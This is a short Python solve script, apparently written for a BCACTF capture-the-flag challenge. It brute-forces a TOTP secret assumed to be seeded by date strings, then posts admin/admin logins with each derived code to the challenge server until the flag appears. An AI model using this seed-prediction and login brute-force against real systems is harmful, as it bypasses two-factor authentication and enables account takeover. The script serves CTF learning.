import random
import requests
import time
import pyotp
from datetime import datetime, timedelta

SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

start = datetime.strptime('2024-05-27', '%Y-%m-%d')
end = datetime.strptime('2024-06-28', '%Y-%m-%d')

current = start
while current <= end:
    print(current.strftime('%Y-%m-%d'))
    random.seed(current.strftime('%Y-%m-%d'))
    rand_str = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])
    totp = pyotp.TOTP(rand_str)

    data = {
        "username": "admin",
        "password": "admin",
        "totp": totp.now()
    }

    # print(rand_str)
    r = requests.post('http://challs.bcactf.com:31772/', data=data)
    if 'bcactf' in r.text:
        print(r.text)
        break
    # time.sleep(0.5)
    current += timedelta(days=1)